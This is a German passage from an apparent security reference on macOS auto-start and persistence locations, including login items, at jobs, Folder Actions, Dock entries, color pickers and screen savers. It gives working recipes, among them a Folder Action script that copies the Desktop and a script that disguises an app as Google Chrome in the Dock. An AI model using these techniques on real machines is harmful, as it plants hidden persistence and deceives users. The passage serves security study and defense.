Standardmäßig werden die Skripte **`/etc/ssh/sshrc`** und **`~/.ssh/rc`** ausgeführt, wenn sich ein Benutzer **über SSH anmeldet**, sofern in `/etc/ssh/sshd_config` nicht `PermitUserRC no` gesetzt ist.<sup>[[14]](#references)</sup>

### **Anmeldeobjekte**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Dazu musst du `osascript` mit Argumenten ausführen
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherorte

- **Registrierte Login-Item-Hilfs-App:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (üblicher Speicherort in einem App-Bundle).
  - **Auslöser:** Die Registrierung kann den Helfer sofort starten; bei späteren Benutzeranmeldungen wird er dann erneut gestartet, sofern er genehmigt wurde.
- **Registrierter gebündelter Agent/Daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` oder `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Auslöser:** Ein genehmigter Agent kann bei der Registrierung und bei späteren Anmeldungen starten; ein genehmigter Daemon startet beim Systemstart. Für einen Daemon ist eine Admin-Genehmigung erforderlich.

#### Beschreibung

Unter **Systemeinstellungen → Allgemein → Anmeldeobjekte & Erweiterungen** können Benutzer Anmelde- und Hintergrundobjekte überprüfen. macOS 13 und neuere Versionen bieten [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice), um gebündelte Anmeldeobjekte, LaunchAgents und LaunchDaemons zu registrieren. Das Verhalten von [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) hängt vom Typ und Genehmigungsstatus ab. **Es reicht nicht aus, einen Helfer in ein App-Bundle zu schreiben, um ein neues Anmeldeobjekt zu registrieren.** Umgekehrt kann eine Änderung der ausführbaren Datei eines bereits registrierten, beschreibbaren Helfers dessen nächsten Start beeinflussen, ohne dass eine neue Registrierung erforderlich ist. Überprüfe zuerst den tatsächlichen Pfad und die Code-Signing-Prüfungen.

Im Folgenden findest du eine schreibgeschützte Methode, um gebündelte Helfer auf einem Mac zu suchen; dabei wird keiner davon registriert oder gestartet:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Bei einer gebündelten Launch-plist ist `BundleProgram` relativ zum Stammverzeichnis des App-Bundles aufzulösen (z. B. `Contents/MacOS/Helper`), wie in [Apples Anleitung zur Migration von Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) angegeben. Eine schreibgeschützte Bestandsaufnahme von `/Applications` auf dem Research-Mac ergab 14 gebündelte Helper-Einträge und fünf `BundleProgram`-Deklarationen; alle fünf Ziele wurden aufgelöst, und zwei bestanden eine Prüfung auf Schreibbarkeit durch den Benutzer. Diese Prüfung belegt **nicht**, dass einer der beiden Helper registriert oder aktiviert ist, nach der Signaturvalidierung ausführbar ist oder von einer Sandbox erreicht werden kann. `sfltool dumpbtm` listete auf diesem Mac 150 benannte Einträge auf; es ist ein Hilfsmittel zur Überprüfung und kein Test dafür, dass jeder Eintrag ausgeführt wird.

Ältere Anmeldeobjekte können auch über Apple Events verwaltet werden. Sie lassen sich über die Befehlszeile auflisten, hinzufügen und entfernen, wobei das Hinzufügen die dauerhafte Anmeldekonfiguration des Benutzers ändert und möglicherweise eine Genehmigung für Automation erfordert:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` ist ein Implementierungsdetail und kein unterstützter Speicherort, um einfach durch Schreiben einer Datei eine Payload zu installieren. Die ältere API `SMLoginItemSetEnabled` wird für neue Helfer durch `SMAppService` ersetzt; der frühere Pfad `/var/db/com.apple.xpc.launchd/loginitems.501.plist` auf dieser Seite war auf dem Testcomputer mit macOS 26.5.2 nicht vorhanden. Verwende zur Bewertung moderner Login Items die Registrierungs-API und den Systemstatus der Benutzeroberfläche, nicht einen angenommenen Datenbankpfad.

### ZIP als Login Item

(Siehe vorherigen Abschnitt über Login Items, dies ist eine Erweiterung)

Wenn du eine **ZIP**-Datei als **Login Item** speicherst, öffnet **`Archive Utility`** sie. Wenn die ZIP-Datei beispielsweise in `~/Library` gespeichert ist und den Ordner **`LaunchAgents/file.plist`** mit einer Backdoor enthält, wird dieser Ordner erstellt (standardmäßig ist er nicht vorhanden) und die plist wird hinzugefügt. Wenn sich der Benutzer das nächste Mal anmeldet, wird die in der plist angegebene **Backdoor ausgeführt**.

Eine weitere Möglichkeit wäre, die Dateien **`.bash_profile`** und **`.zshenv`** im HOME-Verzeichnis des Benutzers zu erstellen, sodass diese Technik weiterhin funktioniert, falls der Ordner LaunchAgents bereits vorhanden ist.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Du musst jedoch **`at`** **ausführen**, und es muss **aktiviert** sein
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`at`** muss **ausgeführt** werden und **aktiviert** sein

#### **Beschreibung**

`at`-Aufgaben dienen dazu, **einmalige Aufgaben zu planen**, die zu bestimmten Zeiten ausgeführt werden. Anders als Cron-Jobs werden `at`-Aufgaben nach der Ausführung automatisch entfernt. Wichtig ist, dass diese Aufgaben Systemneustarts überdauern, wodurch sie unter bestimmten Bedingungen ein potenzielles Sicherheitsrisiko darstellen.<sup>[[16]](#references)</sup>

Die mitgelieferte `com.apple.atrun.plist` enthält `Disabled = true`, aber launchd verwaltet wirksame Aktivierungs-/Deaktivierungsüberschreibungen separat. Auf dem Testcomputer mit macOS 26.5.2 meldete `launchctl print-disabled system` `com.apple.atrun` trotz dieses mitgelieferten Schlüssels als **aktiviert**. Prüfe den wirksamen Status, bevor du behauptest, dass `at`-Jobs ausgeführt werden:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Ein Administrator kann einen deaktivierten `atrun`-Dienst mit `launchctl` aktivieren; das folgende historische Beispiel ändert den Zustand eines Systemdienstes und wurde **nicht** auf dem Forschungs-Mac ausgeführt:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Dadurch wird in 1 Stunde eine Datei erstellt:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Überprüfe die Jobwarteschlange mit `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Oben sehen wir zwei geplante Jobs. Mit `at -c JOBNUMBER` können wir die Details des Jobs ausgeben.

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Wenn AT-Aufgaben nicht aktiviert sind, werden die erstellten Aufgaben nicht ausgeführt.

Die **Job-Dateien** befinden sich unter `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Der Dateiname enthält die Warteschlange, die Jobnummer und den geplanten Ausführungszeitpunkt. Sehen wir uns zum Beispiel `a0001a019bdcd2` an.

- `a` – dies ist die Warteschlange
- `0001a` – Jobnummer in Hexadezimaldarstellung, `0x1a = 26`
- `019bdcd2` – Zeit in Hexadezimaldarstellung. Sie gibt die seit der Epoch vergangenen Minuten an. `0x019bdcd2` entspricht dezimal `26991826`. Multiplizieren wir diesen Wert mit 60, erhalten wir `1619509560`, also `GMT: 2021. April 27., Tuesday 7:46:00`.

Wenn wir die Jobdatei ausgeben, stellen wir fest, dass sie dieselben Informationen enthält, die wir mit `at -c` erhalten haben.

### Kalenderhinweise zum Öffnen von Dateien

- **Schreibziel:** Ein ausführbares App-Bundle oder eine andere Datei, die **bereits** im benutzerdefinierten Kalenderhinweis **Datei öffnen** ausgewählt ist. Zum Erstellen oder Bearbeiten des Hinweises selbst ist Zugriff auf das Kalenderereignis über Calendar oder eine akzeptierte Kalenderdatenquelle erforderlich; durch das Schreiben einer beliebigen Datei wird kein Hinweis erstellt.
- **Auslöser:** Der geplante Zeitpunkt des Hinweises auf einem Mac, auf dem Calendar das Ereignis verarbeitet. Ein wiederkehrendes Ereignis kann die Aktion wiederholt ausführen. [Apples aktuelle Calendar-Anleitung](https://support.apple.com/guide/calendar/icl1012/mac) bestätigt die Hinweisoption **Benutzerdefiniert → Datei öffnen** in macOS 26.
- **Ausführungsidentität und Einschränkungen:** Calendar öffnet die ausgewählte Datei für den angemeldeten Benutzer mit der zugehörigen Anwendung. Beim Starten eines App-Bundles kann dessen Code als dieser Benutzer ausgeführt werden, vorbehaltlich Gatekeeper, Quarantäne und weiterer macOS-Prüfungen. Eine einfache Skriptdatei wird möglicherweise nur in einem Editor geöffnet; ihre Erweiterung allein belegt keine Codeausführung.

Um einen Kandidaten sicher zu bewerten, prüfen Sie den Hinweis des Ereignisses in Calendar und die Berechtigungen der ausgewählten Datei. Dieser Weg wurde anhand von Apples Anleitung dokumentiert und **nicht** auf dem Forschungs-Mac getestet, da dies einen aktiven Kalender verändern und das Eintreten eines Desktop-Ereignisses abwarten würde. In einem Wegwerf-Konto kann ein Marker-only-App-Bundle ausgewählt, ein Hinweis „Datei öffnen“ für einen nahen Zeitpunkt festgelegt, der Start bestätigt und anschließend das Ereignis samt App gelöscht werden.

### Shortcuts-Automationen unter macOS

- **Schreibziel:** Eine ausführbare Datei, auf die eine Aktion eines Kurzbefehls **bereits verweist**, oder ein vorhandener Kurzbefehl, den ein autorisierter Benutzer bearbeiten kann. Eine beliebige `.shortcut`-Datei oder ein Schreibzugriff auf eine undokumentierte Shortcuts-Datenbank ist keine unterstützte Methode zur Registrierung einer Automation.
- **Auslöser und Identität:** Ein zuvor konfiguriertes, aktiviertes Automationsereignis, etwa eine Tageszeit oder ein App-Ereignis, führt den Kurzbefehl für den angemeldeten Benutzer aus. [Apples aktuelle Anleitung zu Mac-Automationen](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) führt unterstützte Ereignisse auf, erklärt, wann eine Automation ohne Nachfrage ausgeführt werden kann, und beschreibt das Entfernen eines Auslösers. [Apples Datenschutzanleitung zu Shortcuts](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) verlangt **Skriptausführung erlauben** für Skriptaktionen; einzelne Aktionen können weiterhin Berechtigungen anfordern.

Dies ist ein bedingter Schreibzugriff-zu-Ausführung-Pfad **nur dann, wenn die vorhandene Aktion ein beschreibbares Ziel lädt**. Das Erstellen einer neuen Automation über die Benutzeroberfläche verändert aktive Einstellungen und wurde auf dem Forschungs-Mac nicht versucht. In einem Wegwerf-Konto kann ein Besitzer einen Kurzbefehl mit Tageszeit-Auslöser konfigurieren, dessen Skript `/tmp/ht-shortcuts-marker` berührt, die erforderlichen Berechtigungen aktivieren, den Marker nach dem Ereignis überprüfen und anschließend Automation, Kurzbefehl und Marker löschen.

### Automator-Aktionen und Quick Actions

- **Schreibziele:** `~/Library/Automator/*.action` (Benutzer) und `/Library/Automator/*.action` (Administrator) für Aktions-Bundles. Ein gespeicherter Quick-Action-Workflow befindet sich üblicherweise unter `~/Library/Services/*.workflow`; prüfen Sie den tatsächlichen Workflow-Pfad, den der Benutzer ausgewählt hat. [Apples Referenz zum Automator-Framework](https://developer.apple.com/documentation/automator) führt die Aktionssuchverzeichnisse auf.
- **Auslöser:** Automator lädt verfügbare Aktions-Bundles beim Start, aber die Aufgabe einer Aktion wird erst ausgeführt, wenn ein Workflow, der sie verwendet, ausgeführt wird. Eine Quick Action wird ausgeführt, wenn der Benutzer sie im Finder, in Services oder in einem anderen angezeigten Menü auswählt. Ein Folder-Action-Workflow wird ausgeführt, wenn Elemente zu seinem **bereits verknüpften** Ordner hinzugefügt werden; ein Calendar-Alarm-Workflow wird zum Ereigniszeitpunkt ausgeführt. [Apples Workflow-Typen](https://support.apple.com/guide/automator/aut7cac58839/mac) unterscheiden diese Ereignisse. Allein das Schreiben einer Aktion oder eines Workflows verknüpft keinen Ordner und plant kein Kalenderereignis.
- **Ausführungsidentität und Einschränkungen:** Das Konto, unter dem der Workflow ausgeführt wird; Automator oder die aufrufende App muss die Aktion laden können, und aktuelle Code-Signing- oder Datenschutzprüfungen müssen die Ausführung zulassen. Ein beschreibbares Aktions-Bundle, auf das ein aktiver Workflow bereits verweist, ist ein anderer Fall als die Installation einer neuen Aktion mit anschließendem Warten auf ihre Auswahl.

Die Benutzerverzeichnisse `Automator` und `Services` waren auf dem Test-Mac mit macOS 26.5.2 vorhanden; `/Library/Automator` fehlte. Es wurde kein aktiver Workflow erstellt, verknüpft oder ausgeführt. Verwenden Sie ein Wegwerf-Konto und eine Marker-only-Aktion bzw. einen entsprechenden Workflow, um einen bestimmten Ladepfad zu überprüfen. Der separate Abschnitt [Folder Actions](#folder-actions) behandelt diese Ereignisquelle ausführlicher.

### Folder Actions

Bericht: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Bericht: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Sie müssen jedoch `osascript` mit Argumenten aufrufen können, um **`System Events`** zu kontaktieren und Folder Actions konfigurieren zu können.
- TCC-Bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Es verfügt über einige grundlegende TCC-Berechtigungen, etwa für Schreibtisch, Dokumente und Downloads.

#### Speicherort

- **`/Library/Scripts/Folder Action Scripts`**
  - Root erforderlich
  - **Auslöser**: Zugriff auf den angegebenen Ordner
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Auslöser**: Zugriff auf den angegebenen Ordner

#### Beschreibung und Ausnutzung

Folder Actions sind Skripte, die automatisch durch Änderungen in einem Ordner ausgelöst werden, etwa durch das Hinzufügen oder Entfernen von Elementen oder durch andere Aktionen wie das Öffnen oder Ändern der Größe des Ordnerfensters. Diese Aktionen lassen sich für verschiedene Aufgaben verwenden und auf unterschiedliche Weise auslösen, etwa über die Finder-Benutzeroberfläche oder Terminalbefehle.<sup>[[17]](#references)[[18]](#references)</sup>

Zum Einrichten von Folder Actions stehen unter anderem folgende Möglichkeiten zur Verfügung:

1. Einen Folder-Action-Workflow mit [Automator](https://support.apple.com/guide/automator/welcome/mac) erstellen und als Dienst installieren.
2. Ein Skript manuell über „Folder Actions Setup“ im Kontextmenü eines Ordners verknüpfen.
3. Mit OSAScript Apple-Event-Nachrichten an `System Events.app` senden, um Folder Actions programmgesteuert einzurichten.
   - Diese Methode eignet sich besonders dafür, die Aktion in das System einzubetten und so ein gewisses Maß an Persistenz zu erreichen.

Das folgende Skript zeigt ein Beispiel dafür, was durch eine Folder Action ausgeführt werden kann:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Um das obige Skript für Folder Actions nutzbar zu machen, kompilieren Sie es mit:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Nachdem das Skript kompiliert wurde, richten Sie Folder Actions ein, indem Sie das folgende Skript ausführen. Dieses Skript aktiviert Folder Actions systemweit und verknüpft das zuvor kompilierte Skript gezielt mit dem Schreibtischordner.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Führen Sie das Setup-Skript mit folgendem Befehl aus:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- So implementierst du diese Persistenz über die GUI:

Dies ist das Skript, das ausgeführt wird:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Kompiliere es mit: `osacompile -l JavaScript -o folder.scpt source.js`

Verschiebe es nach:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Öffnen Sie anschließend die App `Folder Actions Setup`, wählen Sie den **Ordner aus, den Sie überwachen möchten**, und wählen Sie in Ihrem Fall **`folder.scpt`** (in meinem Fall habe ich ihn output2.scp genannt):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Wenn Sie diesen Ordner nun mit **Finder** öffnen, wird Ihr Script ausgeführt.

Diese Konfiguration wurde im **plist** unter **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** im Base64-Format gespeichert.

Versuchen wir nun, diese Persistence ohne GUI-Zugriff einzurichten:

1. **Kopieren Sie `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** nach `/tmp`, um eine Sicherungskopie zu erstellen:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Entfernen** Sie die Folder Actions, die Sie gerade eingerichtet haben:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Nachdem wir nun eine leere Umgebung haben:

3. Kopieren Sie die Sicherungskopie: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Öffnen Sie die App Folder Actions Setup.app, um diese Konfiguration zu übernehmen: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Bei mir hat das nicht funktioniert, aber dies sind die Anweisungen aus dem writeup:(

### Dock-Verknüpfungen

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Allerdings muss eine schädliche Anwendung auf dem System installiert sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `~/Library/Preferences/com.apple.dock.plist`
  - **Auslöser**: Wenn der Benutzer im Dock auf die App klickt

#### Beschreibung & Ausnutzung

Alle Apps, die im Dock angezeigt werden, sind im plist **`~/Library/Preferences/com.apple.dock.plist`** angegeben.<sup>[[19]](#references)</sup>

Es ist möglich, **eine App hinzuzufügen**, und zwar mit:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Mit etwas **social engineering** könntest du **beispielsweise Google Chrome im Dock imitieren** und tatsächlich dein eigenes Skript ausführen:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Eingabemethoden

- **Schreibziel:** Ein codehaltiges Eingabemethoden-App-Bundle, installiert in `~/Library/Input Methods/` (Benutzer) oder `/Library/Input Methods/` (Administrator). Dies unterscheidet sich von Apples Nur-Text-Tastaturzuordnungsdateien `.inputplugin`, die für sich genommen keine Payload mit beliebigem Code sind.
- **Auslöser:** Der Benutzer fügt die Eingabequelle unter **Systemeinstellungen → Tastatur → Texteingabe** hinzu/aktiviert sie und wählt sie anschließend aus oder verwendet sie. Ein Bundle, das lediglich in das Verzeichnis kopiert wird, beweist nicht, dass macOS es starten wird. [Apples aktuelle Anleitung zu Eingabequellen](https://support.apple.com/guide/mac-help/mchl84525d76/mac) beschreibt das Aktivieren und Wechseln von Quellen; [Apples InputMethodKit-Dokumentation](https://developer.apple.com/documentation/inputmethodkit) behandelt codehaltige Eingabemethoden.
- **Ausführungsidentität und Voraussetzungen:** Die Methode wird für den angemeldeten Benutzer ausgeführt, vorbehaltlich der Registrierung der Eingabemethode, der Codesignierung und der aktuellen macOS-Sicherheitsprüfungen. Für bereits aktivierte Methoden mit einer beschreibbaren ausführbaren Datei sind ein separater Pfad- und Signatur-Review erforderlich.

Apples [älterer Hinweis zu Eingabemethoden von Drittanbietern](https://developer.apple.com/library/archive/qa/qa1810/_index.html) warnte bereits davor, dass bestimmte Palettenmethoden durch bloßes Kopieren in diese Verzeichnisse nicht einmal unter „Eingabequellen“ erscheinen. Auf dem Research-Mac mit macOS 26.5.2 ist das Benutzerverzeichnis vorhanden, aber es wurde kein Bundle installiert oder aktiviert. Daher handelt es sich um einen dokumentierten bedingten Pfad und nicht um ein lokales Laufzeitergebnis.

### Farbwähler

Ausarbeitung: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Es muss eine ganz bestimmte Aktion stattfinden
  - Sie landen in einer anderen sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/Library/ColorPickers`
  - Root erforderlich
  - Auslöser: Farbwähler verwenden
- `~/Library/ColorPickers`
  - Auslöser: Farbwähler verwenden

#### Beschreibung & Exploit

**Kompilieren Sie ein Farbwähler-Bundle** mit Ihrem Code (Sie können beispielsweise [**dieses hier verwenden**](https://github.com/viktorstrate/color-picker-plus)), fügen Sie einen constructor hinzu (wie im Abschnitt [Bildschirmschoner](macos-auto-start-locations.md#screen-saver)) und kopieren Sie das Bundle nach `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Wenn der Farbwähler dann ausgelöst wird, sollte auch Ihr Bundle ausgeführt werden.

Dies setzt voraus, dass eine kompatible App das System-Farbpanel öffnet und den installierten Farbwähler auswählt. [Apples Anleitung zum Farbpanel](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) beschreibt die Speicherorte für ältere Bundles. Eine lokale Pfadprüfung fand den älteren XPC-Dienst für Farbwähler, aber auf dem Research-Mac war kein Farbwähler installiert oder geladen. Leiten Sie allein aus dem Pfad keinen TCC bypass ab.

Beachten Sie, dass die Binärdatei, die Ihre Library lädt, eine **sehr restriktive sandbox** hat: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: **Nein, da Sie Ihre eigene App ausführen müssen**
- TCC bypass: Hängt von der Sandbox und den Berechtigungen der aktivierten Extension ab; ein allgemeiner Bypass wurde nicht nachgewiesen.

#### Speicherort

- Eine bestimmte App

#### Beschreibung & Exploit

Ein Anwendungsbeispiel mit einer Finder Sync Extension [**finden Sie hier**](https://github.com/D00MFist/InSync).

Anwendungen können `Finder Sync Extensions` enthalten. Diese Extension wird in eine Anwendung eingebunden, die ausgeführt wird. Damit die Extension ihren Code ausführen kann, **muss sie mit einem gültigen Apple-Entwicklerzertifikat signiert sein**, sie muss **sandboxed** sein (wobei weniger strenge Ausnahmen hinzugefügt werden können) und sie muss mit etwas wie dem Folgenden registriert werden:<sup>[[21]](#references)[[22]](#references)</sup>

Eine installierte Extension muss außerdem **aktiviert** und für einen relevanten Finder-Speicherort oder ein entsprechendes Element aufgerufen werden; das Schreiben eines beliebigen `.appex`-Bundles reicht nicht aus. [Apples Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) stellt den Aktivierungsstatus bereit. Die folgenden `pluginkit`-Befehle veranschaulichen die explizite Registrierung und Aktivierung, nicht einen automatischen Start allein durch das Vorhandensein einer Datei. Dieser Ansatz wurde anhand der Dokumentation überprüft; auf dem Forschungs-Mac wurde keine neue Extension installiert oder aktiviert.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Bildschirmschoner

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Allerdings landest du in einer gewöhnlichen Application-Sandbox
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/System/Library/Screen Savers`
  - Root erforderlich
  - **Auslöser**: Bildschirmschoner auswählen
- `/Library/Screen Savers`
  - Root erforderlich
  - **Auslöser**: Bildschirmschoner auswählen
- `~/Library/Screen Savers`
  - **Auslöser**: Bildschirmschoner auswählen

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beschreibung & Exploit

Erstelle ein neues Projekt in Xcode und wähle die Vorlage aus, um einen neuen **Bildschirmschoner** zu erstellen. Füge dann deinen Code hinzu, zum Beispiel den folgenden Code, um Logs zu erzeugen.<sup>[[23]](#references)[[24]](#references)</sup>

Führe **Build** aus und kopiere das `.saver`-Bundle nach **`~/Library/Screen Savers`**. Öffne dann die Bildschirmschoner-GUI und klicke einfach darauf. Dadurch sollten zahlreiche Logs erzeugt werden:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
